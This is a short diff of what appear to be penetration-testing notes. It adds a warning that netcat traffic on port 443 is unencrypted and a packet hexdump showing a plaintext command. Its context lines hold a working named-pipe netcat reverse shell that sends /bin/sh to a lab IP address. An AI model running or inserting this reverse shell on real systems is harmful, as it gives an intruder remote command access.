@@ -2,3 +2,15 @@
 $ mknod /tmp/backpipe p 
 $ /bin/sh 0</tmp/backpipe | nc 192.168.56.101 443 1>/tmp/backpipe
 
+- USING PORT 443 WITH REGULAR NETCAT DOES NOT ENCRYPT YOUR SHIT
+  - below is a hexdump of a pcap oover 443... see any problems here?
+  - wireshark is misleading on this, because it will identify the protocol as 
+    SSL based on the port, but the actual data is not encrypted
+0000   0a 00 27 00 00 00 08 00 27 99 b1 5f 08 00 45 00   ..'.....'.±_..E.
+0010   00 47 03 d3 40 00 80 06 05 27 c0 a8 38 65 c0 a8   .G.Ó@....'À¨8eÀ¨
+0020   38 01 01 bb eb 20 49 67 3a 5d 68 dc 4f 3a 80 18   8..»ë Ig:]hÜO:..
+0030   01 03 74 67 00 00 01 01 08 0a 00 13 91 d5 65 20   ..tg.........Õe 
+0040   79 25 63 61 74 20 73 75 72 69 2d 72 75 6c 65 73   y%cat suri-rules
+0050   2e 74 78 74 0a                                    .txt.
+
+
